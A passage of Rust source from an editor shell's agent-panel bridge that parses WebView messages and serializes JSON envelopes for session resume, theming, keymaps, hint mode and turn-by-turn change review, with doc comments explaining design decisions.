            | InboundMessage::HistoryPush { request_id, .. }
            | InboundMessage::OpenPath { request_id, .. }
            | InboundMessage::ReviewRequest { request_id, .. }
            | InboundMessage::ReviewDiffRequest { request_id, .. }
            | InboundMessage::ReviewRevert { request_id, .. }
            | InboundMessage::ReviewUndo { request_id, .. }
            | InboundMessage::ReviewCommentAdd { request_id, .. }
            | InboundMessage::ReviewCommentRemove { request_id, .. }
            | InboundMessage::ReviewSend { request_id, .. }
            | InboundMessage::ReviewRecover { request_id, .. }
            | InboundMessage::OpenInEditor { request_id, .. }
            | InboundMessage::ViewInEditor { request_id, .. }
            | InboundMessage::ViewProposal { request_id, .. }
            | InboundMessage::TabVerb { request_id, .. }
            | InboundMessage::CycleDefaultMode { request_id }
            | InboundMessage::CloseOthers { request_id }
            | InboundMessage::ConfirmBypass { request_id, .. }
            | InboundMessage::RestoreLast { request_id, .. }
            | InboundMessage::RestoreAnswer { request_id, .. }
            | InboundMessage::PanelKeys { request_id, .. }
            | InboundMessage::NavFallthrough { request_id, .. }
            | InboundMessage::PaneNav { request_id, .. }
            | InboundMessage::KeymapClosed { request_id, .. }
            | InboundMessage::ViewExported { request_id, .. }
            | InboundMessage::TrustAnswer { request_id, .. }
            | InboundMessage::TrustCancel { request_id, .. }
            | InboundMessage::TrustCommand { request_id, .. }
            | InboundMessage::OpenUrl { request_id, .. } => request_id,
        }
    }
}

/// Parses one JS->Rust message. Never panics -- an unrecognized `type` or malformed JSON becomes
/// `None`, and the caller (`agent_panel.rs`) logs it rather than crashing the whole shell process
/// over one bad message from the WebView. A message that fails to parse has no known `requestId`
/// to reply to, so no `command_result` is possible for it -- this mirrors the pre-v2 behavior
/// exactly (an unparseable message was already silently logged-and-dropped, not surfaced to the
/// frontend).
pub fn parse_inbound_message(json_str: &str) -> Option<InboundMessage> {
    match serde_json::from_str(json_str) {
        Ok(msg) => Some(msg),
        Err(e) => {
            eprintln!("[agent_bridge] failed to parse inbound message: {e} -- raw: {json_str}");
            None
        }
    }
}

/// The most text one copy puts in the primary selection: 1 MiB of UTF-8. The page holds the same
/// number (`agent-ui/web/src/primaryCopy.ts`) and sends nothing longer.
pub const PRIMARY_COPY_MAX_BYTES: usize = 1 << 20;

/// The text of `{"type":"copy_primary","text":...}`, the one message the chat page's handler takes
/// itself: the primary selection belongs to the widget's display, which the panel never sees. Anything
/// else -- another kind, a field more or less, text over `PRIMARY_COPY_MAX_BYTES` -- is `None` and goes
/// on to `parse_inbound_message`, which does not know this kind. The page can already write the
/// clipboard, so this hands it nothing new beyond the second selection, and only as plain text.
pub fn primary_copy(raw: &str) -> Option<String> {
    // Every message the page posts passes through here first; only one that names the kind is parsed
    // twice, and none longer than a capped text can be spelled (six bytes of JSON per byte at most).
    if !raw.contains("\"copy_primary\"") || raw.len() > PRIMARY_COPY_MAX_BYTES * 6 + 64 {
        return None;
    }
    // An object with exactly these two keys: a derived struct would also take the array `[kind, text]`.
    let message: serde_json::Map<String, Value> = serde_json::from_str(raw).ok()?;
    if message.len() != 2 || message.get("type")?.as_str()? != "copy_primary" {
        return None;
    }
    let text = message.get("text")?.as_str()?;
    (text.len() <= PRIMARY_COPY_MAX_BYTES).then(|| text.to_owned())
}

/// Whether `raw` is a message of the `copy_primary` kind, well formed or not. A host takes every such
/// message itself, whether or not it has a primary selection to set: the panel's parser does not know the
/// kind and logs what it cannot parse in full, and this message carries the text the user copied.
pub fn is_primary_copy(raw: &str) -> bool {
    #[derive(Deserialize)]
    struct Kind {
        #[serde(rename = "type")]
        kind: String,
    }
    raw.contains("\"copy_primary\"") && serde_json::from_str::<Kind>(raw).is_ok_and(|m| m.kind == "copy_primary")
}

/// A read reply, correlated with its request and its tab even after a switch.
pub fn serialize_task_output_for_js(
    request_id: &str,
    tab: crate::tabs::TabId,
    task_id: &str,
    output: &agent::TaskOutput,
) -> String {
    json!({ "kind": "task_output_result", "requestId": request_id, "tab": tab.0,
        "taskId": task_id, "output": output.output, "totalBytes": output.total_bytes,
        "truncated": output.truncated, "offset": output.offset })
    .to_string()
}

/// The models a session's CLI offers, answering `list_models`.
pub fn serialize_models_for_js(request_id: &str, tab: crate::tabs::TabId, list: &agent::ModelList) -> String {
    json!({ "kind": "models_result", "requestId": request_id, "tab": tab.0,
        "models": list.models, "applied": list.applied })
    .to_string()
}

/// What the CLI says it will use after a change, answering `set_model` or `apply_effort`.
pub fn serialize_applied_for_js(request_id: &str, tab: crate::tabs::TabId, applied: &agent::AppliedSettings) -> String {
    json!({ "kind": "settings_result", "requestId": request_id, "tab": tab.0, "applied": applied }).to_string()
}

/// Whether `raw` is a message of the `painted` kind, regardless of its other fields. A host takes
/// every message of this kind itself; the panel's parser does not know it.
pub fn is_first_paint(raw: &str) -> bool {
    #[derive(Deserialize)]
    struct Kind {
        #[serde(rename = "type")]
        kind: String,
    }
    raw.contains("\"painted\"")
        && raw.trim_start().starts_with('{')
        && serde_json::from_str::<Kind>(raw).is_ok_and(|m| m.kind == "painted")
}

/// `{"kind":"command_result","requestId":...,"ok":true}` or
/// `{"kind":"command_result","requestId":...,"ok":false,"error":"..."}`.
pub fn serialize_command_result_for_js(request_id: &str, result: Result<(), &str>) -> String {
    match result {
        Ok(()) => json!({ "kind": "command_result", "requestId": request_id, "ok": true }).to_string(),
        Err(error) => {
            json!({ "kind": "command_result", "requestId": request_id, "ok": false, "error": error }).to_string()
        }
    }
}

/// `{"kind":"command_result","requestId":...,"ok":true,"message":"..."}`: a success that has a word of
/// its own to say (`sent`, `queued: ...`), which the panel shows.
pub fn serialize_command_ok_with_message_for_js(request_id: &str, message: &str) -> String {
    json!({ "kind": "command_result", "requestId": request_id, "ok": true, "message": message }).to_string()
}

/// `{"kind":"hello","backend":...,"permissionModes":[...],"resumableSessions":[...],...}` -- sent once,
/// in reply to the frontend's `ready`, BEFORE any snapshot.
///
/// It exists because the frontend's start screen cannot be honest without it. What a backend can
/// offer is a runtime fact -- which permission policies this client can drive, which Verdandi
/// baseline it expects, which sessions this workspace remembers -- and hardcoding any of it into
/// the frontend would make the frontend wrong for whichever backend it was not written against.
///
/// `permissionModes` is deliberately NOT narrowed by backend name: both backends have a real,
/// separately verified interactive gate, so both currently offer the same two. (This doc previously
/// said "the sidecar path ships BYPASS only in this milestone", which stopped being true when
/// `CLIENT_IMPLEMENTED_PERMISSION_MODES` replaced the per-backend narrowing -- see
/// `agent_backend::tests::both_backends_offer_the_same_permission_policies_because_both_implement_them`.)
///
/// `resumableSessions` is the whole resume gate: one entry per session for which the server
/// advertised resume, this client implements it, AND this workspace has a persisted provider
/// session id. The frontend renders its conversation picker on exactly that array and nothing else,
/// so no row can appear for a workspace with nothing to continue, and an empty array is the normal
/// state rather than a missing one.
///
/// Each entry carries only what a record knows: a provider name, the Claude session id, and the two
/// timestamps. There is no title and no summary anywhere in this payload because there is none on
/// disk -- see `agent::ResumableSession`'s own doc for why the one file that could supply one is
/// deliberately not read. A frontend rendering this must not invent a label for a row.
/// **Correction (2026-09-19): there is a `title` now** -- the first line of the session's first
/// prompt, recorded by this project at write time (`agent::persistence::title_from_prompt`), not read
/// from anyone else's file. It is `null` for a session recorded before titles were kept, and the
/// rule stands for those rows: no label is invented.
/// **Correction (2026-09-20): "not read from anyone else's file" is no longer
/// true of this field.** `BackendGreeting::for_kind` fills it from the CLI's own `type:"ai-title"`
/// line where the transcript has one, falling back to the recorded title and then to `null`
/// (`agent::transcript`'s constraint 3). **The frontend is deliberately not told which level a
/// title came from**: source would otherwise leak into rendering, and the whole point of the
/// fallback is that losing the CLI's line returns the picker silently to how it looks today.
/// Nothing about the payload's SHAPE changes, and the no-invented-label rule is untouched.
pub fn serialize_hello_for_js(greeting: &crate::agent_backend::BackendGreeting) -> String {
    serialize_hello_with_restore_for_js(greeting, None)
}

/// [`serialize_hello_for_js`] plus what the launch dashboard may offer to bring back: `restore` is
/// `{"labels":[...],"bypass":n}` -- the tabs the last window had open, in order, and how many of
/// them were in bypass -- or `null` when nothing is on offer (always present, so the frontend reads
/// one shape).
pub fn serialize_hello_with_restore_for_js(
    greeting: &crate::agent_backend::BackendGreeting,
    restore: Option<&crate::tab_restore::RestoreOffer>,
) -> String {
    json!({
        "kind": "hello",
        "backend": greeting.kind.as_str(),
        "projectDir": greeting.project_dir.to_string_lossy(),
        "permissionModes": greeting.permission_modes,
        // The three-term intersection, already evaluated per session: server-advertised (last
        // known) ∩ client-implemented ∩ this workspace has that persisted provider session.
        // Always an array; empty when any term fails, and the frontend renders its picker rows on
        // exactly this and nothing else.
        "resumableSessions": greeting.resumable.iter().map(|r| json!({
            "provider": r.provider,
            "providerSessionId": r.provider_session_id,
            "createdAt": r.created_at,
            "updatedAt": r.updated_at,
            "title": r.title,
            "name": r.name,
        })).collect::<Vec<_>>(),
        "expectedVerdandiRevision": greeting.expected_verdandi_revision,
        // `agent::account`'s configured name, `null` when none is set.
        "account": greeting.account,
        "restore": restore.map(|offer| json!({
            "labels": offer.labels,
            "bypass": offer.bypass,
            "cutNote": offer.cut_note,
        })),
    })
    .to_string()
}

/// `{"kind":"theme","vars":{"--nv-bg":"#faf4ed",...}}` -- the complete CSS custom-property set the
/// panel paints with, derived from nvim's highlight groups (`crate::theme`).
///
/// Sent in the `ready` batch right after `hello`, and again whenever nvim's colours change. Always
/// complete, so the frontend's CSS never needs a fallback value of its own. Kept out of `hello`
/// on purpose: `hello` describes the backend, and a theme change must not resend it.
pub fn serialize_theme_for_js(tokens: &crate::theme::ThemeTokens) -> String {
    let vars: serde_json::Map<String, serde_json::Value> = tokens
        .css_vars()
        .into_iter()
        .map(|(name, value)| (name, serde_json::Value::String(value)))
        .collect();
    json!({ "kind": "theme", "vars": vars }).to_string()
}

/// `{"kind":"display","thinking":"collapsed"|"preview"|"expanded"|"hidden"}`: how the panel shows the
/// agent's thinking (`init.lua`'s `agent.thinking`). Window-level, read once at startup, and sent in the
/// `ready` batch before the tabs, so a fresh or reloaded document draws its first conversation with it.
/// Kept out of `hello`, which describes the backend, and out of `theme`, which is CSS variables only.
pub fn serialize_display_for_js(thinking: crate::agent_prefs::ThinkingDisplay) -> String {
    json!({ "kind": "display", "thinking": thinking.as_str() }).to_string()
}

/// `{"kind":"pane_focus","focused":bool}`: whether the agent panel's pane holds the window's
/// keyboard focus, as `shell`'s GTK focus tracking decides it (`crate::wm::focus`). The panel dims
/// its mode block when this is `false`. `shell` is the source rather than the page's own
/// `window` focus/blur because `shell` decides Ctrl+h/Ctrl+l, and because the same answer also
/// drives the status bar and the pane outline, so the three cannot disagree.
pub fn serialize_pane_focus_for_js(focused: bool) -> String {
    json!({ "kind": "pane_focus", "focused": focused }).to_string()
}

/// `{"kind":"root_note","text":...}`: why this window's project folder is no boundary
/// (`agent::project_boundary::note`). Window-level, no tab; the page shows it as a banner of its own
/// that only its Dismiss clears, so a send or a command notice never takes it away. Sent right after
/// `hello` on every `ready`, so a reloaded document says it again.
pub fn serialize_root_note_for_js(text: &str) -> String {
    json!({ "kind": "root_note", "text": text }).to_string()
}

/// `{"kind":"editor_typing","typing":bool,"periodMs":n}`: whether the user is typing in the editor
/// (`panel_cadence`: the editor holds the keys and pressed one within the last 500 ms), and the
/// gap between the panel's stream pushes while they do. The page slows its own self-driven motion
/// (the turn meter) to no faster than one repaint per `periodMs` while `typing` is true, so it
/// never causes more frame-clock cycles than the cadence does. Sent only when that changes
/// something -- a cadence slower than the meter's own step (`panel_cadence::SELF_DRIVEN_STEP_MS`)
/// -- and again after every document load while typing. Window-level: no tab.
pub fn serialize_editor_typing_for_js(typing: bool, period_ms: u32) -> String {
    json!({ "kind": "editor_typing", "typing": typing, "periodMs": period_ms }).to_string()
}

/// `{"kind":"enter_input"}`: the user moved INTO the panel with the keyboard (`Ctrl+l` from the
/// editor), so the panel should open its composer with a blinking caret, the way it did before the
/// three-mode rework made BROWSE the landing mode: arriving by keyboard means the user is about to
/// type. A separate envelope rather than a flag on `pane_focus`, because only
/// the keyboard route should do it. A click on a row still lands in BROWSE on that row, which is
/// what the click points at, and `pane_focus` cannot tell the two apart.
pub fn serialize_enter_input_for_js() -> String {
    json!({ "kind": "enter_input" }).to_string()
}

/// `{"kind":"arrive"}`: the keys moved into the panel by keyboard -- replaces
/// `enter_input` at the two arrival sites. Unlike `enter_input`, arriving lands BROWSE
/// rather than opening the composer straight into INPUT. Which row it lands on is the page's own
/// choice, not something this envelope carries: a waiting card, else the last row for a reader
/// who was following it, else the row and scroll they left.
pub fn serialize_arrive_for_js() -> String {
    json!({ "kind": "arrive" }).to_string()
}

/// `{"kind":"focus_permission","tab":...}`: the chat was brought back to answer a card -- its tray
/// chip `agent ⚑N` activated, or `Ctrl+a a` with a card waiting. The panel goes
/// to BROWSE with its cursor on the oldest pending card. `shell` sends it only when the count it
/// keeps (`crate::attention`) is above zero; a panel that finds no card takes the composer instead,
/// as it does for `enter_input`. `tab` names the session tab it is about; the panel drops it unless
/// that tab is active, the only one it draws.
pub fn serialize_focus_permission_for_js(tab: crate::tabs::TabId) -> String {
    json!({ "kind": "focus_permission", "tab": tab.0 }).to_string()
}

/// `{"kind":"keymap", ...}`: the `?` overlay's two `shell` sections, generated from
/// `eitri_core::keymap` -- `window` from the root table, `prefixKeys` from the
/// effective prefix table -- and the prefix as a person reads it, for the heading `After <prefix>`.
/// Sent on every `ready`.
///
/// Also carries the agent panel's own BROWSE table, `panel` (`effective()`'s), and
/// `newTabChord` -- the prefix chord that opens a new tab, spelled
/// out for the chooser's `New session` row (`Ctrl+b c`, from the effective prefix
/// table). Sent again whenever `effective()`'s result changes, same as before.
///
/// `tmuxSkipped`: the lines of the user's tmux config the import did not take, each as
/// `<file>:<line>` and what was written with why, for the overlay's "Skipped from tmux" section;
/// empty when nothing was skipped or the import is off.
pub fn serialize_keymap_for_js(
    prefix: &str,
    window: &[crate::keymap::HelpRow],
    prefix_keys: &[crate::keymap::HelpRow],
    panel: &crate::keymap::panel::PanelKeymap,
    new_tab_chord: &str,
    tmux_skipped: &[crate::keymap::HelpRow],
) -> String {
    use crate::keymap::panel::{LeaderSource, PanelKey, PanelSource};

    let leader_source = match panel.leader_source {
        LeaderSource::Default => "default",
        LeaderSource::Mapleader => "mapleader",
        LeaderSource::Unset => "unset",
        LeaderSource::Unusable => "unusable",
    };
    let leader_wire = match panel.leader {
        PanelKey::Leader => "<leader>".to_string(),
        PanelKey::Space => " ".to_string(),
        PanelKey::Char(c) => c.to_string(),
    };
    let bindings: Vec<Value> = panel
        .bindings
        .iter()
        .map(|b| {
            let source = match b.source {
                PanelSource::Default => "default",
                PanelSource::Nvim => "nvim",
                PanelSource::User => "init.lua",
            };
            json!({
                "keys": b.seq.wire(),
                "action": b.action.name(),
                "desc": b.action.desc(),
                "source": source,
            })
        })
        .collect();
    let groups: Vec<Value> = crate::keymap::panel::DEFAULT_GROUPS
        .iter()
        .map(|(keys, label)| {
            let seq = crate::keymap::panel::parse_seq(keys)
                .unwrap_or_else(|why| panic!("DEFAULT_GROUPS key {keys:?} must parse: {why}"));
            json!({ "keys": seq.wire(), "label": label })
        })
        .collect();
    let panel_json = json!({
        "leader": leader_wire,
        "leaderLabel": panel.leader_label,
        "leaderSource": leader_source,
        "timeoutlen": panel.timeoutlen_ms,
        "timeout": panel.timeout,
        "bindings": bindings,
        "groups": groups,
    });
    json!({
        "kind": "keymap",
        "prefix": prefix,
        "window": window,
        "prefixKeys": prefix_keys,
        "panel": panel_json,
        "newTabChord": new_tab_chord,
        "tmuxSkipped": tmux_skipped,
    })
    .to_string()
}

/// `{"kind":"literal_key","key":"C-a"}`: `send-prefix`/`send-keys` with the panel holding the keys
/// WebKitGTK cannot be handed a key, so the panel acts on the ones it knows --
/// `C-a`, select all in a text field -- and ignores the rest. `key` is tmux's spelling.
pub fn serialize_literal_key_for_js(key: &str) -> String {
    json!({ "kind": "literal_key", "key": key }).to_string()
}

/// `{"kind":"open_keymap","opening":N}`: `prefix ?` -- open the `?` overlay, in BROWSE. `opening` numbers this
/// opening, and the page quotes it back in `keymap_closed`. With a plugin page's section
/// (`{"kind":"open_keymap","opening":N,"plugin":{"title":..,"rows":[{"keys","what"}]}}`) when that page held the keys.
pub fn serialize_open_keymap_for_js(plugin: Option<&crate::plugin::keys::PluginKeysHelp>, opening: u64) -> String {
    match plugin {
        Some(plugin) => json!({ "kind": "open_keymap", "opening": opening, "plugin": plugin }).to_string(),
        None => json!({ "kind": "open_keymap", "opening": opening }).to_string(),
    }
}

/// `{"kind":"open_command_line"}`: `prefix :` (tmux `command-prompt`) -- open
/// the panel's `:` line, in BROWSE. The line runs nothing (Enter says so, Esc closes it); it exists so
/// the letters typed after the chord land in a box instead of running as panel keys.
pub fn serialize_open_command_line_for_js() -> String {
    json!({ "kind": "open_command_line" }).to_string()
}

/// `{"kind":"nav_key","direction":"down"}` / `"up"`: the `Ctrl+j`/`Ctrl+k` decision, made in Rust
/// from the `panel_keys` mirror -- `Ctrl+j` claimed in BROWSE, or `Ctrl+k` claimed in INPUT. The page
/// applies it against its own current state and, if that no longer matches, replies
/// `nav_fallthrough` (`InboundMessage::NavFallthrough`).
/// A move to the other window is about to take `tab`: the page answers with its view of it
/// ([`InboundMessage::ViewExported`] carrying `request`).
pub fn serialize_view_export_for_js(request: u64, tab: crate::tabs::TabId) -> String {
    json!({ "kind": "view_export", "request": request, "tab": tab.0 }).to_string()
}

/// The view another window's page had of `tab`, which moved here: the page keeps it for the tab, as it keeps the
/// view of a tab it switched away from, and shows it when the tab is shown. Passed on as it came.
pub fn serialize_view_import_for_js(tab: crate::tabs::TabId, view: &serde_json::Value) -> String {
    json!({ "kind": "view_import", "tab": tab.0, "view": view }).to_string()
}

pub fn serialize_nav_key_for_js(direction: NavKeyDirection) -> String {
    let direction = match direction {
        NavKeyDirection::Down => "down",
        NavKeyDirection::Up => "up",
    };
    json!({ "kind": "nav_key", "direction": direction }).to_string()
}

/// Global `f` HINT. `shell`
/// owns the session; these five tell the panel to report, show, narrow, land and clear.
pub fn serialize_hint_collect_for_js(session_id: u64) -> String {
    json!({ "kind": "hint_collect", "sessionId": session_id }).to_string()
}
pub fn serialize_hint_show_for_js(session_id: u64, labels: &[String]) -> String {
    json!({ "kind": "hint_show", "sessionId": session_id, "labels": labels }).to_string()
}
pub fn serialize_hint_prefix_for_js(session_id: u64, typed: &str) -> String {
    json!({ "kind": "hint_prefix", "sessionId": session_id, "typed": typed }).to_string()
}
pub fn serialize_hint_land_for_js(session_id: u64, index: usize) -> String {
    json!({ "kind": "hint_land", "sessionId": session_id, "index": index }).to_string()
}
pub fn serialize_hint_end_for_js(session_id: u64) -> String {
    json!({ "kind": "hint_end", "sessionId": session_id }).to_string()
}

/// Which turn a `review_request` asks about: the newest one, or one by its number in the session.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ReviewTurnWire {
    Latest,
    N(u32),
}

impl<'de> Deserialize<'de> for ReviewTurnWire {
    /// `"latest"` or a non-negative integer; any other string, a negative or fractional number, or
    /// `null` is a parse failure rather than a default.
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        #[derive(Deserialize)]
        #[serde(untagged)]
        enum Raw {
            Tag(LatestTag),
            N(u32),
        }
        #[derive(Deserialize)]
        #[serde(rename_all = "snake_case")]
        enum LatestTag {
            Latest,
        }
        Ok(match Raw::deserialize(deserializer)? {
            Raw::Tag(LatestTag::Latest) => ReviewTurnWire::Latest,
            Raw::N(n) => ReviewTurnWire::N(n),
        })
    }
}

impl From<ReviewTurnWire> for crate::turn_review::TurnRef {
    fn from(turn: ReviewTurnWire) -> Self {
        match turn {
            ReviewTurnWire::Latest => crate::turn_review::TurnRef::Latest,
            ReviewTurnWire::N(n) => crate::turn_review::TurnRef::N(n),
        }
    }
}

/// One turn's changes, or the whole session's.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ReviewScopeWire {
    Turn,
    Session,
}

impl From<ReviewScopeWire> for crate::turn_review::Scope {
    fn from(scope: ReviewScopeWire) -> Self {
        match scope {
            ReviewScopeWire::Turn => crate::turn_review::Scope::Turn,
            ReviewScopeWire::Session => crate::turn_review::Scope::Session,
        }
    }
}

/// What a `review_revert` names: one hunk by its id and header (both must still match the turn's
/// patch, so a revert of a hunk that has moved is refused), or the whole file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ReviewRevertTargetWire {
    Hunk { id: u32, header: String },
    File,
}

impl<'de> Deserialize<'de> for ReviewRevertTargetWire {
    /// The string `"file"` or `{"hunk": n, "header": "..."}`; anything else is a parse failure.
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        #[derive(Deserialize)]
        #[serde(rename_all = "snake_case")]
        enum FileTag {
            File,
        }
        #[derive(Deserialize)]
        #[serde(untagged)]
        enum Raw {
            Tag(FileTag),
            Hunk { hunk: u32, header: String },
        }
        Ok(match Raw::deserialize(deserializer)? {
            Raw::Tag(FileTag::File) => ReviewRevertTargetWire::File,
            Raw::Hunk { hunk, header } => ReviewRevertTargetWire::Hunk { id: hunk, header },
        })
    }
}

/// The answer to the question a write that did not finish leaves: put the file back, or let it go.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ReviewRecoverAnswerWire {
    Restore,
    Dismiss,
}

/// `{"kind":"review","requestId":...,"tab":...,"scope":...,"current":...,"turns":[...],"files":[...],
/// "compared":...,"pendingNoResult":...,"notes":[...]}`: the answer to a `review_request`. It states what the
/// snapshots measured -- files that changed on disk during the turn -- and `origin` carries the
/// attribution: `agent` (named by the turn's own edit calls), `agent_only` (named, but unchanged
/// on disk) or `workspace` (changed with no call naming it). A path that is not valid UTF-8 is
/// sent lossily, and a `review_diff_request` for a name that reads like another changed file's is
/// refused (`ReviewError::AmbiguousPath`), so a patch is never shown for the wrong file. A review
/// that was worked out is answered by this envelope alone; only a failure is a `command_result`.
/// `compared: false` means nothing was compared (no baseline, or one still being taken), so an
/// empty `files` is no claim that nothing changed. `notes` are every line the review must say about
/// itself, in order -- the panel draws them as they are and derives none from the turn flags.
/// `draft` is the tab's comments and reverts, sent with every review so a panel that was reloaded
/// draws them again.
pub fn serialize_review_for_js(
    request_id: &str,
    tab: crate::tabs::TabId,
    overview: &crate::turn_review::Overview,
    draft: &crate::turn_review::ReviewDraft,
) -> String {
    use crate::turn_review::Origin;
    let turns: Vec<Value> = overview
        .turns
        .iter()
        .map(|turn| {
            let state = turn.state();
            json!({
                "n": turn.n,
                "turnId": turn.turn_id,
                "startedAt": turn.started_ms,
                "endedAt": turn.ended_ms,
                "state": state.as_str(),
                "late": turn.late,
                "overlappedNext": turn.overlapped_next,
                "overlappedTab": turn.overlapped_tab,
                "reason": state.reason(),
            })
        })
        .collect();
    let files: Vec<Value> = overview
        .files
        .iter()
        .map(|file| {
            json!({
                "path": file.path.to_string_lossy(),
                "added": file.added,
                "removed": file.removed,
                "origin": match file.origin {
                    Origin::Agent => "agent",
                    Origin::AgentOnly => "agent_only",
                    Origin::Workspace => "workspace",
                },
                "binary": file.binary,
                "tooLarge": file.too_large,
                "nested": file.nested,
            })
        })
        .collect();
    json!({
        "kind": "review",
        "requestId": request_id,
        "tab": tab.0,
        "scope": overview.scope.as_str(),
        "current": overview.current,
        "turns": turns,
        "files": files,
        "compared": overview.compared,
        "pendingNoResult": overview.pending_no_result,
        "notes": overview.notes,
        "draft": draft_value(draft),
    })
    .to_string()
}

/// The draft as the panel draws it: its comments, its reverts and whether `u` has anything to undo.
/// A revert's `lines` is the range it covers when it is a hunk, `null` for a whole-file revert.
fn draft_value(draft: &crate::turn_review::ReviewDraft) -> Value {
    use crate::turn_review::RevertShape;
    let comments: Vec<Value> = draft
        .comments()
        .iter()
        .map(|c| {
            json!({
                "id": c.id,
                "turn": c.turn,
                "path": c.path,
                "from": c.from,
                "to": c.to,
                "anchor": c.anchor,
                "text": c.text,
            })
        })
        .collect();
    let reverts: Vec<Value> = draft
        .reverts()
        .iter()
        .map(|r| {
            let (what, lines) = match r.new.shape {
                RevertShape::Lines { from, to } => ("hunk", json!([from, to])),
                RevertShape::Deleted => ("deleted", Value::Null),
                RevertShape::Restored => ("restored", Value::Null),
                RevertShape::WholeFile => ("file", Value::Null),
            };
            json!({
                "id": r.id,
                "turn": r.new.turn,
                "path": r.new.path,
                "hunk": r.new.hunk.as_ref().map(|(id, _)| id),
                "header": r.new.hunk.as_ref().map(|(_, header)| header),
                "what": what,
                "lines": lines,
                "source": match r.new.source {
                    crate::turn_review::RevertSource::Panel => "panel",
                    crate::turn_review::RevertSource::Editor => "editor",
                },
                "undone": r.undone,
            })
        })
        .collect();
    json!({
        "comments": comments,
        "reverts": reverts,
        "canUndo": draft.last_undoable().is_some(),
    })
}

/// `{"kind":"review_draft","requestId":...,"tab":...,"draft":{...}}`: the tab's draft after a change.
/// `request_id` is the request that asked for the change, `null` for a change the panel did not ask
/// for (a revert or undo landing, a revert made in the editor).
pub fn serialize_review_draft_for_js(
    request_id: Option<&str>,
    tab: crate::tabs::TabId,
    draft: &crate::turn_review::ReviewDraft,
) -> String {
    json!({
        "kind": "review_draft",
        "requestId": request_id,
        "tab": tab.0,
        "draft": draft_value(draft),
    })
    .to_string()
}

/// `{"kind":"review_send_preview","requestId":...,"tab":...,"digest":...,"text":...,"notOnDisk":[...],
/// "queued":...}`: the message a `review_send` would send and every revert it leaves out, for the
/// `y`/`n` the user answers. `what` is the revert's kind as the draft names it (`hunk`, `deleted`,
/// `restored`, `file`); `lines` is its range when it is a hunk and `null` for a whole-file revert, so
/// the page must word an entry without a range. `queued` says the tab is busy, so a confirmed send
/// waits for the running turn to end.
pub fn serialize_review_send_preview_for_js(
    request_id: &str,
    tab: crate::tabs::TabId,
    draft: &crate::turn_review::ReviewDraft,
    preview: &crate::turn_review::Preview,
    queued: bool,
) -> String {
    use crate::turn_review::RevertShape;
    let not_on_disk: Vec<Value> = preview
        .not_on_disk
        .iter()
        .filter_map(|(id, status)| {
            let record = draft.reverts().iter().find(|r| r.id == *id)?;
            let (what, lines) = match record.new.shape {
                RevertShape::Lines { from, to } => ("hunk", json!([from, to])),
                RevertShape::Deleted => ("deleted", Value::Null),
                RevertShape::Restored => ("restored", Value::Null),
                RevertShape::WholeFile => ("file", Value::Null),
            };
            Some(json!({
                "id": id,
                "path": record.new.path,
                "what": what,
                "lines": lines,
                "why": status.why(),
            }))
        })
        .collect();
    json!({
        "kind": "review_send_preview",
        "requestId": request_id,
        "tab": tab.0,
        "digest": preview.digest,
        "text": preview.text,
        "notOnDisk": not_on_disk,
        "queued": queued,
    })
    .to_string()
}

/// `{"kind":"review_recovery","entries":[{"id":...,"path":...,"at":...}]}`: writes that did not finish,
/// for the panel to ask about. `at` is when the write started, in milliseconds since the epoch.
pub fn serialize_review_recovery_for_js(entries: &[crate::turn_review::JournalEntry]) -> String {
    let entries: Vec<Value> = entries
        .iter()
        .map(|entry| json!({ "id": entry.id, "path": entry.path.to_string_lossy(), "at": entry.at_ms }))
        .collect();
    json!({ "kind": "review_recovery", "entries": entries }).to_string()
}

/// `{"kind":"review_diff","requestId":...,"tab":...,"turn":...,"path":...,"added":...,"removed":...,
/// "binary":...,"newFile":...,"deletedFile":...,"hunks":[...]}`: the answer to a `review_diff_request`. `hunks` is `null` when the patch is over
/// the display cap -- refused, not cut -- and `added`/`removed` are still given.
pub fn serialize_review_diff_for_js(
    request_id: &str,
    tab: crate::tabs::TabId,
    diff: &crate::turn_review::ReviewDiff,
) -> String {
    use crate::turn_review::LineKind;
    let hunks = diff.hunks.as_ref().map(|hunks| {
        hunks
            .iter()
            .map(|hunk| {
                let lines: Vec<Value> = hunk
                    .lines
                    .iter()
                    .map(|line| {
                        json!({
                            "kind": match line.kind {
                                LineKind::Context => "context",
                                LineKind::Added => "added",
                                LineKind::Removed => "removed",
                                LineKind::NoNewline => "no_newline",
                            },
                            "text": line.text,
                            "oldNo": line.old_no,
                            "newNo": line.new_no,
                        })
                    })
                    .collect();
                json!({ "id": hunk.id, "header": hunk.header, "lines": lines })
            })
            .collect::<Vec<Value>>()
    });
    json!({
        "kind": "review_diff",
        "requestId": request_id,
        "tab": tab.0,
        "turn": diff.turn,
        "path": diff.path.to_string_lossy(),
        "added": diff.added,
        "removed": diff.removed,
        "binary": diff.binary,
        "newFile": diff.new_file,
        "deletedFile": diff.deleted_file,
        "hunks": hunks,
    })
    .to_string()
}

/// `{"kind":"review_hint","tab":...,"turn":...,"files":...}`: a turn ended with `files` files
/// differing between its snapshots, for the status band. `files: 0` clears the hint.
pub fn serialize_review_hint_for_js(hint: &crate::turn_review::ReviewHint) -> String {
    json!({ "kind": "review_hint", "tab": hint.tab, "turn": hint.turn, "files": hint.files }).to_string()
}

/// `{"kind":"review_settings","enabled":bool,"hint":bool}`: the window's turn review switches as the
/// page needs them. `enabled` is whether a review is installed, so `c` can open one (`review.enabled`
/// and a backend with turn boundaries); `hint` is `review.hint`. Window-level, sent in the `ready`
/// batch before the tabs and again when `init.lua`'s values are applied. The page draws its running
/// turn's change line only when both are true, and a page that never got this envelope treats both as
/// false, so an older host leaves the page quiet.
pub fn serialize_review_settings_for_js(enabled: bool, hint: bool) -> String {
    json!({ "kind": "review_settings", "enabled": enabled, "hint": hint }).to_string()
}

/// `{"kind":"events","tab":...,"fromRevision":...,"throughRevision":...,"events":[<AgentDomainEvent JSON>, ...]}`.
/// `AgentDomainEvent`'s own `#[derive(Serialize)]` produces the tagged shape for each element.
/// `from_revision` is the revision before the first delivered event, and `through_revision` is
/// the last delivered event's post-fold revision. The notes-aware tagged envelope also carries
